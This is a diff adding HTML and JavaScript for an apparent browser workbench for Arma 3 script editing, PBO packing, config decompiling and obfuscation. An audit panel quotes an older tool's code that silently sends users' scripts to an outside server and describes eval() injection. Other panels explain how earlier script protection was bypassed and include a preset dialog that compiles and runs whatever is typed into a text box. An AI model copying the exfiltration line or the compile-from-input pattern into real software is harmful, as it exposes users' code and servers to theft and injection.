+                            <i class="fa-regular fa-copy mr-1"></i>Copy
+                        </button>
+                    </div>
+                    <div id="aceObfOutput" class="w-full h-[390px]"></div>
+                </div>
+            </div>
+
+            <!-- Binary PBO Entry Table & Live Hex Header Inspector -->
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-4">
+                <div class="lg:col-span-7 bg-rv-panel border border-rv-border rounded-xl overflow-hidden shadow-lg">
+                    <div class="px-4 py-2.5 bg-rv-surface border-b border-rv-border flex items-center justify-between">
+                        <span class="font-mono text-xs font-bold uppercase text-white"><i class="fa-solid fa-table-list text-cyan-400 mr-1.5"></i>Binary .PBO Header Entry Table (21-Byte Structs + `sreV` Properties)</span>
+                        <span id="pboEntryCountBadge" class="text-[11px] font-mono text-cyan-300">0 Entries</span>
+                    </div>
+                    <div class="overflow-x-auto max-h-60">
+                        <table class="w-full text-left font-mono text-xs border-collapse">
+                            <thead>
+                                <tr class="bg-rv-bg/70 border-b border-rv-border text-slate-400 text-[11px] uppercase">
+                                    <th class="py-2 px-3">#</th>
+                                    <th class="py-2 px-3">VFS Filename</th>
+                                    <th class="py-2 px-3">Mime / Packing</th>
+                                    <th class="py-2 px-3">Timestamp</th>
+                                    <th class="py-2 px-3">Data Size</th>
+                                    <th class="py-2 px-3">Role / Protection</th>
+                                </tr>
+                            </thead>
+                            <tbody id="pboHeaderTableBody" class="divide-y divide-rv-border/50">
+                                <!-- Populated dynamically -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Live Binary PBO Hex Dump -->
+                <div class="lg:col-span-5 bg-rv-panel border border-rv-border rounded-xl overflow-hidden flex flex-col shadow-lg">
+                    <div class="px-4 py-2.5 bg-rv-surface border-b border-rv-border flex items-center justify-between">
+                        <span class="font-mono text-xs font-bold uppercase text-white"><i class="fa-solid fa-memory text-amber-400 mr-1.5"></i>PBO Binary Stream Hex Inspector</span>
+                        <span class="text-[11px] font-mono text-slate-400">0x00 73 72 65 56 (`\0sreV`)</span>
+                    </div>
+                    <pre id="pboHexDumpView" class="p-3 font-mono text-[11px] leading-relaxed text-slate-300 bg-rv-bg flex-1 overflow-auto max-h-60 select-all"></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- ========================================================================= -->
+        <!-- WORKBENCH 3: raP (\0raP) BINARY DECOMPILER & SQM -> SQF EXPORTER          -->
+        <!-- ========================================================================= -->
+        <section id="wb-rap" class="workbench-panel hidden flex-col gap-4">
+            <div class="bg-rv-panel border border-rv-border rounded-xl p-4 flex flex-wrap items-center justify-between gap-4 shadow-lg">
+                <div>
+                    <h2 class="font-display font-bold text-base text-white flex items-center gap-2">
+                        <i class="fa-solid fa-file-Waveform text-cyan-400"></i>
+                        Bohemia Interactive <code class="text-amber-400 font-mono">\0raP</code> (`0x00 0x72 0x61 0x50`) Binary Decompiler &amp; SQM &rarr; SQF Vehicle Exporter
+                    </h2>
+                    <p class="text-xs text-slate-400 mt-0.5">Client-side `ArrayBuffer` parser for BIS 7-bit `CompressedInt`, `RapClass`, `ValueEq` (String/Float32/Int32), `ArrayEq`, `ExternClass`, &amp; `DeleteClass` packets.</p>
+                </div>
+
+                <div class="flex flex-wrap items-center gap-2">
+                    <button onclick="synthesizeAndDecompileSampleRap('config')" class="px-3 py-1.5 rounded-lg bg-amber-500 text-slate-950 font-mono text-xs font-bold hover:bg-amber-400 transition shadow">
+                        <i class="fa-solid fa-microchip mr-1"></i>Synthesize &amp; Decompile Binary `config.bin`
+                    </button>
+                    <button onclick="synthesizeAndDecompileSampleRap('sqm')" class="px-3 py-1.5 rounded-lg bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 font-mono text-xs font-semibold hover:bg-cyan-500/30 transition">
+                        <i class="fa-solid fa-map-location-dot mr-1"></i>Synthesize Binary `mission.sqm` &rarr; Decompile
+                    </button>
+                    <button onclick="transpileSqmToSqfVehicles()" class="px-3 py-1.5 rounded-lg bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 font-mono text-xs font-semibold hover:bg-emerald-500/30 transition">
+                        <i class="fa-solid fa-truck-monster mr-1"></i>SQM Entities &rarr; `createSimpleObject` SQF
+                    </button>
+                    <label class="cursor-pointer px-3 py-1.5 rounded-lg bg-rv-surface hover:bg-slate-800 text-slate-200 border border-rv-border font-mono text-xs transition">
+                        <i class="fa-solid fa-upload text-amber-400 mr-1"></i>Upload `.bin` / `.sqm` / `.rvmat`
+                        <input type="file" class="hidden" onchange="handleRapBinaryUpload(event)">
+                    </label>
+                    <button onclick="downloadSampleRapBinary()" class="px-3 py-1.5 rounded-lg bg-rv-bg hover:bg-slate-800 text-slate-300 border border-rv-border font-mono text-xs transition" title="Download the raw binary \0raP buffer to disk">
+                        <i class="fa-solid fa-download mr-1"></i>Save `.bin`
+                    </button>
+                </div>
+            </div>
+
+            <!-- Split View: Binary Packet Telemetry & Hex Stream (Left) + Decompiled Config/SQF Ace Editor (Right) -->
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-4">
+                <!-- Left 5 Cols: Binary Stream Hex + Packet Tree -->
+                <div class="lg:col-span-5 flex flex-col gap-4">
+                    <div class="bg-rv-panel border border-rv-border rounded-xl overflow-hidden flex flex-col shadow-lg">
+                        <div class="px-4 py-2.5 bg-rv-surface border-b border-rv-border flex items-center justify-between">
+                            <span class="font-mono text-xs font-bold uppercase text-white"><i class="fa-solid fa-binary text-amber-400 mr-1.5"></i>Raw `\0raP` Binary Buffer Hex View</span>
+                            <span id="rapBinaryMetaBadge" class="text-[11px] font-mono text-amber-300">0 Bytes</span>
+                        </div>
+                        <pre id="rapHexView" class="p-3 font-mono text-[11px] leading-relaxed text-slate-300 bg-rv-bg h-56 overflow-auto select-all"></pre>
+                    </div>
+
+                    <div class="bg-rv-panel border border-rv-border rounded-xl overflow-hidden flex flex-col shadow-lg flex-1">
+                        <div class="px-4 py-2.5 bg-rv-surface border-b border-rv-border flex items-center justify-between">
+                            <span class="font-mono text-xs font-bold uppercase text-white"><i class="fa-solid fa-sitemap text-cyan-400 mr-1.5"></i>Decoded `raP` Packet Stream Trace</span>
+                            <span id="rapPacketCountBadge" class="text-[11px] font-mono text-cyan-300">0 Packets</span>
+                        </div>
+                        <div class="max-h-64 overflow-y-auto">
+                            <table class="w-full text-left font-mono text-xs border-collapse">
+                                <thead>
+                                    <tr class="bg-rv-bg/70 border-b border-rv-border text-slate-400 text-[11px] uppercase">
+                                        <th class="py-1.5 px-3">Offset</th>
+                                        <th class="py-1.5 px-3">Packet Type</th>
+                                        <th class="py-1.5 px-3">Identifier</th>
+                                        <th class="py-1.5 px-3">Decoded Value / Meta</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="rapPacketTableBody" class="divide-y divide-rv-border/50">
+                                    <!-- Populated dynamically -->
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right 7 Cols: Decompiled Cfg / SQM / SQF Output Editor -->
+                <div class="lg:col-span-7 bg-rv-panel border border-rv-border rounded-xl overflow-hidden flex flex-col shadow-lg">
+                    <div class="px-4 py-2.5 bg-rv-surface border-b border-rv-border flex items-center justify-between">
+                        <div class="flex items-center gap-2">
+                            <span class="w-2.5 h-2.5 rounded-full bg-emerald-400"></span>
+                            <span id="rapEditorTitle" class="font-mono text-xs font-bold uppercase text-white">Decompiled Class Output (.cpp / .sqm / .sqf)</span>
+                        </div>
+                        <div class="flex items-center gap-2">
+                            <button onclick="copyRapEditorContent()" class="px-2.5 py-1 rounded bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/30 text-[11px] font-mono">
+                                <i class="fa-regular fa-copy mr-1"></i>Copy Output
+                            </button>
+                            <button onclick="sendRapToStudio()" class="px-2.5 py-1 rounded bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/30 text-[11px] font-mono">
+                                <i class="fa-solid fa-arrow-up-right-from-square mr-1"></i>Open in SQF Studio
+                            </button>
+                        </div>
+                    </div>
+                    <div id="aceRapOutput" class="w-full h-[520px]"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ========================================================================= -->
+        <!-- WORKBENCH 4: ARCHITECTURE TEARDOWN, IEEE-754 LAB & 2016 FORENSIC AUDIT    -->
+        <!-- ========================================================================= -->
+        <section id="wb-teardown" class="workbench-panel hidden flex-col gap-5">
+            <!-- Interactive IEEE-754 Single-Precision Float32 Drift & Surrogate Crash Simulator -->
+            <div class="bg-rv-panel border border-rv-border rounded-xl p-5 shadow-lg">
+                <div class="flex flex-wrap items-center justify-between gap-3 border-b border-rv-border pb-4 mb-4">
+                    <div>
+                        <span class="text-[11px] font-mono uppercase px-2 py-0.5 rounded bg-red-500/15 text-red-400 border border-red-500/30">Interactive RV4 VM Telemetry Lab</span>
+                        <h2 class="font-display font-bold text-lg text-white mt-1">Why 2016 `sqrt(x^2 + key)` &amp; Unicode Shift Crash `arma3_x64.exe`</h2>
+                        <p class="text-xs text-slate-400">Arma 3's Real Virtuality VM stores all numbers as 32-bit IEEE-754 `float` (24-bit mantissa = max exact integer `16,777,216`) and rejects UTF-16 surrogates (`0xD800–0xDFFF`) in `toString`.</p>
+                    </div>
+                    <div class="flex flex-wrap items-center gap-3 font-mono text-xs">
+                        <div>
+                            <label class="block text-slate-400 text-[11px]">Test Payload String:</label>
+                            <input id="driftTestString" type="text" value="player setVariable ['cash', 50000, true];" oninput="runFloat32DriftSimulation()" class="bg-rv-bg border border-rv-border rounded-lg px-3 py-1.5 text-white w-72 focus:outline-none focus:border-amber-500">
+                        </div>
+                        <div>
+                            <label class="block text-slate-400 text-[11px]">2016 Key / UID Multiplier:</label>
+                            <input id="driftTestMultiplier" type="number" value="15843" oninput="runFloat32DriftSimulation()" class="bg-rv-bg border border-rv-border rounded-lg px-3 py-1.5 text-amber-300 w-36 focus:outline-none focus:border-amber-500">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Simulation Results Table -->
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 mb-4">
+                    <div class="p-3.5 rounded-lg bg-rv-bg border border-rv-border">
+                        <div class="text-[11px] font-mono text-slate-400 uppercase">2016 `SScryptkeytoStringRandom` Result</div>
+                        <div id="simSummaryUnicode" class="font-mono text-sm font-bold text-red-400 mt-1">Checking...</div>
+                        <p class="text-[11px] text-slate-400 mt-1">Computes `String.fromCharCode((c * c) + key)`. When `(c^2 + key)` lands in `0xD800..0xDFFF` (55296..57343) or `&gt; 0xFFFF`, UTF-16 encoding corrupts the string literal.</p>
+                    </div>
+                    <div class="p-3.5 rounded-lg bg-rv-bg border border-rv-border">
+                        <div class="text-[11px] font-mono text-slate-400 uppercase">2016 `RandomCryptkeyPlayerid` Float32 Drift</div>
+                        <div id="simSummaryFloat32" class="font-mono text-sm font-bold text-amber-400 mt-1">Checking...</div>
+                        <p class="text-[11px] text-slate-400 mt-1">In `arma3_x64.exe`, `parseNumber (getPlayerUID player)` truncates 17-digit Steam64 IDs (`76561198...`) to `7.65612e+016`, losing the last 9 digits of precision.</p>
+                    </div>
+                    <div class="p-3.5 rounded-lg bg-emerald-950/20 border border-emerald-500/30">
+                        <div class="text-[11px] font-mono text-emerald-400 uppercase">2026 Pure-Integer RC4-PRGA Result</div>
+                        <div class="font-mono text-sm font-bold text-emerald-300 mt-1">0 Drift | Max State = 765 &ll; 16,777,216</div>
+                        <p class="text-[11px] text-slate-300 mt-1">Every intermediate KSA/PRGA operation stays inside `[0..765]`, 21,900x below the IEEE-754 32-bit float rounding threshold.</p>
+                    </div>
+                </div>
+
+                <div class="max-h-60 overflow-y-auto border border-rv-border rounded-lg">
+                    <table class="w-full text-left font-mono text-xs border-collapse">
+                        <thead>
+                            <tr class="bg-rv-surface border-b border-rv-border text-slate-400 text-[11px] uppercase">
+                                <th class="py-2 px-3">Char</th>
+                                <th class="py-2 px-3">ASCII</th>
+                                <th class="py-2 px-3">2016 `(c² + key)` Codepoint</th>
+                                <th class="py-2 px-3">UTF-16 / `toString` Status</th>
+                                <th class="py-2 px-3">Float32 Large Multiplier Roundtrip</th>
+                                <th class="py-2 px-3">2026 RC4-PRGA Byte</th>
+                            </tr>
+                        </thead>
+                        <tbody id="floatSimTableBody" class="divide-y divide-rv-border/50 bg-rv-bg/50">
+                            <!-- Populated dynamically -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Forensic Audit of the Uploaded 2016 `ni1kko/a3-webbased-tools` Codebase -->
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+                <!-- Left: 5 Critical Bugs Found in 2016 editor.js -->
+                <div class="bg-rv-panel border border-rv-border rounded-xl p-5 flex flex-col gap-3 shadow-lg">
+                    <div class="flex items-center justify-between border-b border-rv-border pb-3">
+                        <h3 class="font-display font-bold text-base text-white flex items-center gap-2">
+                            <i class="fa-solid fa-magnifying-glass-chart text-red-400"></i>
+                            Forensic Code Audit: 2016 `editor.js` Vulnerabilities &amp; Bugs
+                        </h3>
+                        <span class="text-[11px] font-mono px-2 py-0.5 rounded bg-red-500/15 text-red-300 border border-red-500/30">5 Critical Defects Verified</span>
+                    </div>
+
+                    <div class="space-y-3 font-mono text-xs overflow-y-auto max-h-[460px] pr-1">
+                        <div class="p-3 rounded-lg bg-rv-bg border-l-4 border-red-500 border border-rv-border">
+                            <div class="font-bold text-red-400">1. Silent Code Exfiltration Backdoor (`editor.js` lines 344–358)</div>
+                            <p class="text-slate-300 mt-1 font-sans text-xs">`getInputValue()` opened an unencrypted `XMLHttpRequest` to `http://www.armatools.fallox.cloud/SQFBin/api/create` and transmitted `editor1.getValue()` without user consent.</p>
+                            <pre class="mt-2 p-2 rounded bg-black/60 text-[11px] text-red-300 overflow-x-auto">xhttp.open("GET", "http://www.armatools.fallox.cloud/SQFBin/api/create", true);
+xhttp.send("name=V2-Converter&private=0&text=" + codeInput);</pre>
+                        </div>
+
+                        <div class="p-3 rounded-lg bg-rv-bg border-l-4 border-amber-500 border border-rv-border">
+                            <div class="font-bold text-amber-400">2. Destructive Minifier Regex Typo (`editor.js` lines 473–476)</div>
+                            <p class="text-slate-300 mt-1 font-sans text-xs">In `minifyCode()`, the author copy-pasted the `>` replacement rule and accidentally replaced every `* ` (multiply) and `/ ` (divide) with `>` (greater-than), breaking all math in minified scripts!</p>
+                            <pre class="mt-2 p-2 rounded bg-black/60 text-[11px] text-amber-300 overflow-x-auto">// 2016 editor.js lines 473-476 (BROKEN):
+codeInput = codeInput.replace(/\* /g, '>');
+codeInput = codeInput.replace(/\/ /g, '>');</pre>
+                        </div>
+
+                        <div class="p-3 rounded-lg bg-rv-bg border-l-4 border-amber-500 border border-rv-border">
+                            <div class="font-bold text-amber-400">3. Broken `IsecoCryptkeyGUID` Cipher Mismatch (`editor.js` lines 765–774)</div>
+                            <p class="text-slate-300 mt-1 font-sans text-xs">`IsecoCryptkeyGUID` encrypted each character via multiplication (`numberArray[i] * key`), but the generated SQF stub attempted to decrypt via subtraction (`(_decryptme select _i) - (_Array select _counter)`), producing garbage bytecode that never compiled.</p>
+                        </div>
+
+                        <div class="p-3 rounded-lg bg-rv-bg border-l-4 border-cyan-500 border border-rv-border">
+                            <div class="font-bold text-cyan-400">4. Unescaped `eval()` Injection (`editor.js` lines 422, 488, 646)</div>
+                            <p class="text-slate-300 mt-1 font-sans text-xs">`RandomVariable`, `codeCracker`, and `desplitString` passed raw user strings directly into browser `eval("magicVars = " + magicVars)`, allowing arbitrary DOM/JS execution when inspecting untrusted scripts.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right: Evolution of Arma 3 Obfuscation Architecture -->
+                <div class="bg-rv-panel border border-rv-border rounded-xl p-5 flex flex-col gap-3 shadow-lg">
+                    <div class="flex items-center justify-between border-b border-rv-border pb-3">
+                        <h3 class="font-display font-bold text-base text-white flex items-center gap-2">
+                            <i class="fa-solid fa-Chess-knight text-emerald-400"></i>
+                            Cat-and-Mouse Evolution: Mikero vs. Maverick vs. Split-Key VFS
+                        </h3>
+                        <span class="text-[11px] font-mono px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">Architectural Comparison</span>
+                    </div>
+
+                    <div class="space-y-3 text-xs overflow-y-auto max-h-[460px] pr-1">
+                        <div class="p-3.5 rounded-lg bg-rv-bg border border-rv-border">
+                            <div class="flex items-center justify-between font-mono">
+                                <span class="text-red-400 font-bold">STAGE 1: Mikero `PboObscure` (2014–2016)</span>
+                                <span class="px-2 py-0.5 rounded bg-red-500/10 text-red-300 text-[10px]">BYPASSED IN SECONDS</span>
+                            </div>
+                            <p class="text-slate-300 mt-1.5">Injected `"obfuscated"="true"` into the `sreV` PBO header and added dummy file table pointers. Bypassed on UnKnoWnCheaTs by zeroing the header string in a hex editor (`BankRev` then unpacked everything) or loading the PBO into Eden Editor and running `copyToClipboard (preprocessFile "prefix\init.sqf")`.</p>
+                        </div>
+
+                        <div class="p-3.5 rounded-lg bg-rv-bg border border-rv-border">
+                            <div class="flex items-center justify-between font-mono">
+                                <span class="text-amber-400 font-bold">STAGE 2: Maverick `ObfuSQF` v1 (2017–2018)</span>
+                                <span class="px-2 py-0.5 rounded bg-amber-500/10 text-amber-300 text-[10px]">BYPASSED VIA MEMORY DUMP</span>
+                            </div>
+                            <p class="text-slate-300 mt-1.5">Created deep Windows-illegal folder trees (`CON\`, `NUL\`, trailing dots) so Windows Explorer choked on extraction, paired with `#include` hooks. Bypassed by setting `allowedPreprocessFileExtensions[] = {""};` and iterating `allVariables missionNamespace` after mission boot to dump compiled functions in plaintext.</p>
+                        </div>
+
+                        <div class="p-3.5 rounded-lg bg-emerald-950/20 border border-emerald-500/40">
+                            <div class="flex items-center justify-between font-mono">
+                                <span class="text-emerald-400 font-bold">STAGE 3: Modern Split-Key VFS + RC4-Drop256 (Implemented Here)</span>
+                                <span class="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 text-[10px]">ACTIVE PROTECTION</span>
+                            </div>
+                            <ul class="mt-2 space-y-1.5 text-slate-300 list-disc list-inside">
+                                <li><strong class="text-white">Split Header Keying (`sreV`):</strong> Half-A of the cipher seed lives in the binary PBO `sreV` header (`svn_rev`). Standard extractors (`BankRev`, `PBO Manager`) discard unknown header properties on unpack—meaning unpacking the PBO destroys Half-A of the key.</li>
+                                <li><strong class="text-white">`preprocessFile` Poisoning:</strong> Every `.sqf` file on disk is a pure-integer RC4-Drop256 ciphertext array. Running `preprocessFile` in Eden Editor yields only encrypted byte blocks.</li>
+                                <li><strong class="text-white">Self-Scrubbing `preInit` Stub:</strong> Checks `!is3DEN`, combines Half-A + server-held Half-B, compiles functions with `compileFinal`, and overwrites the key array with `nil` before `postInit`.</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="border-t border-rv-border bg-rv-panel py-3 px-4 mt-auto">
+        <div class="max-w-[1600px] mx-auto flex flex-wrap items-center justify-between gap-2 text-xs font-mono text-slate-400">
+            <div>RV4 // Real Virtuality Engineering Workbench &bull; Built for Arma 3 x64 (2.18+)</div>
+            <div class="flex items-center gap-4">
+                <span class="text-emerald-400"><i class="fa-solid fa-check-double mr-1"></i>No External API Calls</span>
+                <span>IEEE-754 Single-Precision Safe</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- QUICK SPEC SHEET MODAL (Hidden by default, no alert/confirm used) -->
+    <div id="specModal" class="fixed inset-0 z-50 hidden bg-black/75 backdrop-blur-sm flex items-center justify-center p-4">
+        <div class="bg-rv-panel border border-rv-border rounded-2xl max-w-2xl w-full p-6 shadow-2xl">
+            <div class="flex items-center justify-between border-b border-rv-border pb-3 mb-4">
+                <h3 class="font-display font-bold text-lg text-white flex items-center gap-2">
+                    <i class="fa-solid fa-book-journal-whills text-amber-400"></i>
+                    RV4 Engineering Workbench // Technical Specification
+                </h3>
+                <button onclick="closeQuickHelpModal()" class="text-slate-400 hover:text-white text-lg">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
+            <div class="space-y-3 text-xs text-slate-300 leading-relaxed font-mono">
+                <p><strong class="text-amber-400">1. AST-Aware SQF Studio:</strong> Tokenizes SQF into Strings, Comments, Preprocessor Directives (`#define`, `#include`), and Code tokens. Never mangles `*` or `/` operators or multi-line macros.</p>
+                <p><strong class="text-emerald-400">2. Pure-Integer RC4-Drop256 Stream Cipher:</strong> Drops the first 256 bytes of PRGA output to defeat FMS weak-key biases and operates strictly on integers `0..255` so Arma 3's 32-bit `float` engine never experiences mantissa rounding drift.</p>
+                <p><strong class="text-cyan-400">3. Binary `.PBO` &amp; `\0raP` Streams:</strong> Implements little-endian binary packing for Bohemia Interactive's PBO archive format (`sreV` header + SHA-1 checksum trailer) and `raP` binarized configs (7-bit compressed integers + recursive class/value packets).</p>
+            </div>
+            <div class="mt-5 pt-3 border-t border-rv-border flex justify-end">
+                <button onclick="closeQuickHelpModal()" class="px-4 py-1.5 rounded-lg bg-amber-500 text-slate-950 font-mono text-xs font-bold">Close Specification</button>
+            </div>
+        </div>
     </div>
-    <div id="choose2">
-        <h1>Converter</h1>
-        <a href="convert.html">
-            <img src="https://ni1kko.github.io/a3-webbased-tools/img/2.png">
-        </a>
-    </div>
-   
+
+    <!-- TACTICAL TOAST NOTIFICATION CONTAINER -->
+    <div id="toastContainer" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2 pointer-events-none"></div>
+
+    <!-- ========================================================================= -->
+    <!-- CORE APPLICATION JAVASCRIPT                                               -->
+    <!-- ========================================================================= -->
+    <script>
+        /*************************************************************************
+         * 0. GLOBAL STATE, TACTICAL TOASTS & CLIPBOARD / DOWNLOAD HELPERS
+         *************************************************************************/
+        let aceStudioInput, aceStudioOutput, aceObfInput, aceObfOutput, aceRapOutput;
+        let currentObfView = 'standalone'; // 'standalone' | 'serverstub'
+        let lastStandaloneObfCode = '';
+        let lastServerStubCode = '';
+        let lastCompiledPboBytes = null;
+        let lastSynthesizedRapBytes = null;
+
+        // Arma 3 2.18+ Reserved Magic Variables (Never rename these in Local/Global Variable Renamer)
+        const ARMA3_MAGIC_VARS = new Set([
+            "_this", "_x", "_forEachIndex", "_thisEventHandler", "_thisScript", "_thisArgs",
+            "_thisFSM", "_units", "_shift", "_alt", "_uid", "_id", "_pos", "_name", "_jip",
+            "_owner", "_time", "_target", "_caller", "_actionId", "_arguments", "this",
+            "thisList", "thisTrigger", "player", "serverTime", "diag_tickTime", "missionNamespace",
+            "uiNamespace", "profileNamespace", "parsingNamespace", "controlNull", "displayNull",
+            "objNull", "grpNull", "locationNull", "taskNull", "teamMemberNull", "scriptNull",
+            "configNull", "true", "false", "nil", "west", "east", "resistance", "civilian",
+            "sideLogic", "sideEmpty", "sideUnknown", "safeZoneX", "safeZoneY", "safeZoneW",
+            "safeZoneH", "safeZoneXAbs", "safeZoneWAbs", "GUI_GRID_X", "GUI_GRID_Y", "GUI_GRID_W", "GUI_GRID_H"
+        ]);
+
+        // Preset Templates for Workbench 1
+        const STUDIO_PRESETS = {
+            sqf_macros: `// ============================================================================
+// ARMA 3 x64 MISSION INITIALIZATION & NET SYNC (WITH #define MACROS)
+// ============================================================================
+#include "\\a3\\ui_f\\hpp\\defineResincl.inc"
+#define GET_CTRL(disp,ctrl) ((findDisplay ##disp) displayCtrl ##ctrl)
+#define LOG_TELEMETRY(msg) diag_log format ["[RV4-CORE] %1 @ %2", msg, diag_tickTime]
+
+params [["_unit", objNull, [objNull]], ["_isJip", false, [false]]];
+
+private _sessionToken = "rv4_auth_9921";
+_unscopedLeakVar = getPosASL _unit; // <-- Linter will flag this unscoped local variable!
+
+if (isNull _unit) exitWith {
+    LOG_TELEMETRY("Unit is null, aborting initialization.");
+};
+
+// Linter will flag unscheduled suspension & deprecated command below:
+sleep 0.5;
+_nearEntities = _unit nearEntities ["Man", 25];
+{
+    _distance = _unit distance _x;
+    if (_distance < 15 && {alive _x}) then {
+        _x setVariable ["rv_synced", true, true];
+    };
+} forEach _nearEntities;
+
+call compile format ["TAG_var_%1 = %2;", getPlayerUID _unit, _sessionToken];`,
+
+            hpp_gui: `class RscTacticalDialog {
+    idd = 4600;
+    movingEnable = 1;
+    class controls {
+        class RscFrame_1800: RscFrame {
+            idc = 1800;
+            text = "RV4 TACTICAL COMMAND CONSOLE";
+            x = 0.29375 * safezoneW + safezoneX;
+            y = 0.313 * safezoneH + safezoneY;
+            w = 0.4125 * safezoneW;
+            h = 0.352 * safezoneH;
+            colorText[] = {0.96, 0.62, 0.04, 1};
+            colorBackground[] = {0.06, 0.08, 0.11, 0.95};
+        };
+        class RscEdit_1400: RscEdit {
+            idc = 1400;
+            text = "diag_log [diag_fps, diag_tickTime];";
+            x = 0.304 * safezoneW + safezoneX;
+            y = 0.357 * safezoneH + safezoneY;
+            w = 0.392 * safezoneW;
+            h = 0.044 * safezoneH;
+            colorText[] = {0.88, 0.91, 0.94, 1};
+            colorBackground[] = {0.03, 0.04, 0.06, 1};
+            tooltip = "Enter SQF expression to evaluate in scheduled scope";
+        };
+        class RscButton_1600: RscButton {
+            idc = 1600;
+            text = "EXECUTE TELEMETRY";
+            x = 0.304 * safezoneW + safezoneX;
+            y = 0.418 * safezoneH + safezoneY;
+            w = 0.190 * safezoneW;
+            h = 0.044 * safezoneH;
+            colorText[] = {0.05, 0.07, 0.09, 1};
+            colorBackground[] = {0.96, 0.62, 0.04, 1};
+            colorActive[] = {0.06, 0.72, 0.50, 1};
+            font = "PuristaSemiBold";
+            sizeEx = 0.038;
+            tooltip = "Executes payload safely";
+            action = "call compile (ctrlText 1400); systemChat 'Telemetry executed.';";
+        };
+    };
+};`,
+
+            iseco_2016: `// Legacy 2016 Iseco Custom Key Encrypted Payload (Click "Deobfuscate 2016 Payload" above!)
+_Decrypt = {_Key='vQ^N2Qdf@xV.X;.WIq5c';_DecryptMe = _this;_counter = 0;_Array = toArray(_Key);for '_i' from 0 to (count(_decryptme)-1) do {if(_counter > (count(_Array)-1)) then {_counter = 0;};_var = (_decryptme select _i) / (_Array select _counter);_decryptme set[_i,_var];_counter = _counter + 1;};toString(_decryptme);};call compile([13570, 8181, 9306, 8892, 5050, 9396, 3200, 11832, 6464, 14400, 9976] call _Decrypt);`,
+
+            minified_mess: `#define MACRO_SCALE(val) ((val) * 1.25)\nprivate["_a","_b"];_a=10;_b=MACRO_SCALE(_a);if(_b>5)then{{if(alive _x)then{_x setDamage 0;systemChat format["Healed %1",name _x];};}forEach (allPlayers select {isPlayer _x});}else{diag_log "Skipped";};`
+        };
+
+        // Virtual File System (VFS) state for Workbench 2 (.PBO Packer)
+        let vfsFiles = [
+            {
+                name: "init.sqf",
+                content: `// Mission Root Entrypoint\nif (!isDedicated && {hasInterface}) then {\n    [] call RV4_fnc_clientInit;\n};`
+            },
+            {
+                name: "functions\\fn_clientInit.sqf",
+                content: `/*\n * Author: RV4 Hardened Security\n * Description: Client-side protected telemetry & anti-tamper loop\n */\nparams [["_mode", "INIT", [""]]];\nprivate _token = missionNamespace getVariable ["RV4_AuthToken", ""];\nsystemChat format ["[RV4] Protected Client Initialized (%1)", _mode];\ndiag_log format ["[RV4] FPS: %1 | Tick: %2", round diag_fps, diag_tickTime];`
+            },
+            {
+                name: "functions\\fn_netSync.sqf",
+                content: `params [["_target", objNull], ["_payload", []]];\nif (isNull _target) exitWith {false};\n_target setVariable ["RV4_LastSync", serverTime, true];\ntrue`
+            },
+            {
+                name: "config.cpp",
+                content: `class CfgPatches {\n    class rv_protected_core {\n        units[] = {};\n        weapons[] = {};\n        requiredVersion = 2.18;\n        requiredAddons[] = {"A3_Data_F"};\n    };\n};`
+            }
+        ];
+        let activeVfsIndex = 1;
+
+        function showToast(message, type = 'emerald') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            const colors = {
+                emerald: 'bg-emerald-950/95 border-emerald-500/50 text-emerald-200',
+                amber: 'bg-amber-950/95 border-amber-500/50 text-amber-200',
+                crimson: 'bg-red-950/95 border-red-500/50 text-red-200',
+                cyan: 'bg-cyan-950/95 border-cyan-500/50 text-cyan-200'
+            };
+            toast.className = `pointer-events-auto px-4 py-2.5 rounded-xl border shadow-xl font-mono text-xs flex items-center gap-2.5 ${colors[type] || colors.emerald}`;
+            toast.innerHTML = `<i class="fa-solid fa-terminal"></i><span>${message}</span>`;
+            container.appendChild(toast);
+
+            gsap.fromTo(toast, { opacity: 0, x: 30 }, { opacity: 1, x: 0, duration: 0.25 });
+            setTimeout(() => {
+                gsap.to(toast, {
+                    opacity: 0,
+                    x: 30,
+                    duration: 0.25,
+                    onComplete: () => toast.remove()
+                });
+            }, 3400);
+        }
+
+        function copyTextToClipboard(text, label = "Code") {
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            textarea.style.position = 'fixed';
+            textarea.style.opacity = '0';
+            document.body.appendChild(textarea);
+            textarea.select();
+            try {
+                document.execCommand('copy');
+                showToast(`${label} copied to clipboard (${text.length} bytes)`, 'emerald');
+            } catch (err) {
+                showToast(`Failed to copy ${label}`, 'crimson');
+            }
+            document.body.removeChild(textarea);
+        }
+
+        function downloadBlob(bytesOrText, filename, mimeType = 'text/plain;charset=utf-8') {
+            const blob = new Blob([bytesOrText], { type: mimeType });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`Downloaded ${filename}`, 'amber');
+        }
+
+        function openQuickHelpModal() {
+            document.getElementById('specModal').classList.remove('hidden');
+        }
+        function closeQuickHelpModal() {
+            document.getElementById('specModal').classList.add('hidden');
+        }
+
+        /*************************************************************************
